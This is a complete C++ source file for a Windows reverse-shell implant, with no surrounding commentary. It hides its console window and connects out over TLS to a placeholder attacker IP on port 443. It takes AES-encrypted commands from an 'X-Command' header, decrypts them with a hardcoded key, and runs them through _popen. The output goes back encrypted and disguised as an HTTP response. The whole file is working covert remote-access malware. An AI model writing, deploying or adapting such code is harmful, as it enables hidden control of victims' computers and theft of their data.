#include <winsock2.h>
#include <windows.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <vector>
#include <stdexcept>
#include <stdio.h>
#include "AES_CBC.h"
#include <iostream>
#include <string>
#include <sstream>
#pragma comment(lib, "WS2_32")
#pragma comment(lib, "crypt32")

void InitializeSSL() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX* CreateSSLContext() {
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void CleanupSSL() {
    EVP_cleanup();
}

std::string ExtractCommand(const std::string& request) {
    std::string header = "X-Command: ";
    size_t pos = request.find(header);
    if (pos != std::string::npos) {
        size_t end_pos = request.find("\r\n", pos);
        return request.substr(pos + header.length(), end_pos - pos - header.length());
    }
    return "";
}

int main(int argc, char* argv[]) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    const char* IP = "10.10.10.10"; // replace IP
    const short PORT = 443;


    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        return 1;
    }

    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed: %d\n", WSAGetLastError());
        return 1;
    }

    InitializeSSL();
    SSL_CTX* ctx = CreateSSLContext();

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    }
    else {
        printf("Connected with %s encryption\n", SSL_get_cipher(ssl));

        char buffer[4096];
        while (true) {

            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
            if (bytes > 0) {
                buffer[bytes] = '\0';

                std::string request(buffer);
                std::string command = ExtractCommand(request); 

                unsigned char key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0x6d, 0x29, 0x58, 0x41, 0x60, 0x74, 0x5c, 0x3e, 0x7b, 0x71, 0x3a };
                unsigned char iv[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

                AES_CBC aes(key, iv);

                std::string decryptedCommand = decryptCommand(command, aes);

                if (!decryptedCommand.empty()) {

                    FILE* fp = _popen(decryptedCommand.c_str(), "r");
                    if (!fp) {
                        break;
                    }

                    std::ostringstream response;
                    char result[1024];
                    while (fgets(result, sizeof(result), fp) != NULL) {
                        response << result;
                    }
                    _pclose(fp);

                    std::string encryptedResponse = encryptCommand(response.str(), aes);

                    std::ostringstream httpResponse;
                    httpResponse << "HTTP/1.1 200 OK\r\n"
                        << "Content-Type: text/plain\r\n"
                        << "Content-Length: " << encryptedResponse.length() << "\r\n\r\n"
                        << encryptedResponse;

                    SSL_write(ssl, httpResponse.str().c_str(), httpResponse.str().length());


                    std::string decryptedResponse = decryptCommand(encryptedResponse, aes);

                }
                else {
                    printf("[-] No valid command found in headers\n");
                }
            }
        }
    }

    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    CleanupSSL();
    WSACleanup();

    return 0;
}
